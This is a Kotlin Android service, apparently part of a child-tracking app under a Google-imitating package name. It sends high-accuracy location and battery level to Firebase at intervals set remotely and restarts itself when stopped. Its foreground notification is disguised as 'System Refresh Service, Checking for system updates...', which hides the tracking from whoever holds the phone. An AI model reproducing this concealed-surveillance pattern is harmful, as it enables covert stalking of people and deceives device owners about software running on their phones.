package com.googlehome.protect.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.location.Location
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.googlehome.protect.data.ModeManager
import com.googlehome.protect.data.repository.FirebaseRepository
import com.googlehome.protect.model.LocationEntry
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch

class LocationService : Service() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private val repository = FirebaseRepository()
    private lateinit var modeManager: ModeManager
    private var currentInterval = 10000L
    private var powerSavingEnabled = false
    private var isPowerSavingThrottled = false

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        modeManager = ModeManager(this)

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    onLocationUpdated(location)
                    checkPowerSaving()
                }
            }
        }
        
        listenToSettings()
    }

    private fun listenToSettings() {
        serviceScope.launch {
            val childId = modeManager.childId.first() ?: return@launch
            repository.getChildLocation(childId).collect { child ->
                child?.let {
                    if (it.trackingInterval != currentInterval || it.powerSavingEnabled != powerSavingEnabled) {
                        currentInterval = it.trackingInterval
                        powerSavingEnabled = it.powerSavingEnabled
                        requestLocationUpdates() // Restart with new interval
                    }
                }
            }
        }
    }

    private fun checkPowerSaving() {
        if (!powerSavingEnabled) {
            if (isPowerSavingThrottled) {
                isPowerSavingThrottled = false
                requestLocationUpdates()
            }
            return
        }
        
        val battery = getBatteryLevel()
        if (battery < 20 && !isPowerSavingThrottled) {
            isPowerSavingThrottled = true
            requestLocationUpdates() // Will use throttled interval
        } else if (battery >= 20 && isPowerSavingThrottled) {
            isPowerSavingThrottled = false
            requestLocationUpdates()
        }
    }

    private fun onLocationUpdated(location: Location) {
        serviceScope.launch {
            val childId = modeManager.childId.first() ?: return@launch
            val entry = LocationEntry(
                latitude = location.latitude,
                longitude = location.longitude,
                accuracy = location.accuracy.toDouble(),
                battery = getBatteryLevel(),
                timestamp = System.currentTimeMillis()
            )
            repository.updateLocation(childId, entry)
        }
    }

    private fun getBatteryLevel(): Int {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
            registerReceiver(null, filter)
        }
        val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return (level / scale.toFloat() * 100).toInt()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, createNotification())
        requestLocationUpdates()
        return START_STICKY
    }

    private fun requestLocationUpdates() {
        val interval = if (isPowerSavingThrottled) {
            (currentInterval * 2).coerceAtLeast(30000L) // Slow down by 2x, min 30s
        } else {
            currentInterval
        }
        
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, interval).apply {
            setMinUpdateDistanceMeters(0f)
            setWaitForAccurateLocation(false)
        }.build()

        try {
            fusedLocationClient.removeLocationUpdates(locationCallback)
            fusedLocationClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper())
        } catch (unlikely: SecurityException) {
            // Log or handle
        }
    }

    private fun createNotification(): Notification {
        val channelId = "system_service"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Refresh Service")
            .setContentText("Checking for system updates...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        fusedLocationClient.removeLocationUpdates(locationCallback)
    }
}
